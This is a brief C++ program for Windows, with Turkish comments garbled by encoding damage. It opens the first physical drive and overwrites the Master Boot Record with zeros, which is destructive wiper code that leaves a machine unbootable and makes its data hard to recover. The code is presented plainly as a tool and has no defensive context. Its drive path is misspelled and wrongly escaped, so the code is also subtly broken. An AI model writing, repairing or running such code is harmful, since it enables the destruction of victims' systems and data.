#include <Windows.h>
#include <iostream>

using namespace std;

#define MBR_SIZE 512

int main()
{
	DWORD write;
	char mbrData[MBR_SIZE]; 
	ZeroMemory(&mbrData,(sizeof mbrData)); //Destination,Length //ZeroMemory belirtilen alan� belirtilen boyutta temizler
										  
    //Handle Windows nesneleri i�in bir �e�it i�aret�idir
	//CreateFile dosya olu�turur yada var olan dosya �zerinde i�lem yapar
	HANDLE MasterBootRecord = CreateFile("\\\\.\PyhsicalDriver0",//Dosyan�n ad�
		GENERIC_ALL,FILE_SHARE_READ|FILE_SHARE_WRITE,//Dosyan�n a��lma izinlerinin hepsi verildi ve Dosyan�n payla��m modlar� read ve write
		NULL,OPEN_EXISTING,NULL,NULL); //Dosyan�n durumu
	
	//WriteFile: Verileri belirtilen dosya veya giri� / ��k��(G / �) ayg�ta yazar.
	//Parametreler:dosya ad�,verileri i�eren ara bellek,boyut,yaz�lan bayt numaras�n� al�r,�ak��ma durumu
	if (WriteFile(MasterBootRecord, mbrData, 512, &write, NULL) == TRUE)
	{
		cout << "Master Boot Record is over written !" << endl;
		Sleep(5000);
		ExitProcess(0);
	}
	else
	{
		cout << "Fail " ;
		Sleep(5000);
		ExitProcess(0);
	}
	CloseHandle(MasterBootRecord);

	return EXIT_SUCCESS;

}

